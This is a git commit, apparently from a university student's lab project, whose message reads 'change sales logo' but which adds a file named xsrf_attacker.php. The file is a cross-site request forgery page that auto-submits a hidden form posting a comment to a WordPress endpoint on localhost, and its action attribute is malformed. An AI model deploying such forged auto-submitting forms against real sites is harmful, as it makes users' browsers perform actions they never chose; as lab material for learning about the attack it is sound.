d65bc65866e828a214af2bbac9a2a8cdd88a482a
1400205 <1400205@rgu.ac.uk>
2016-07-07 12:46:01 +0100

    change sales logo

---
+++ xsrf_attacker.php
@@ -0,0 +1,13 @@
+<html>
+
+<body>
+<form name="CSRF" action =action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
+    <input type="hidden" name="comment" Value="XSRF ATTACK ONE">
+
+</form>
+<input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
+<script>
+    document.CSRF.submit();
+</script>
+</body>
+</html>
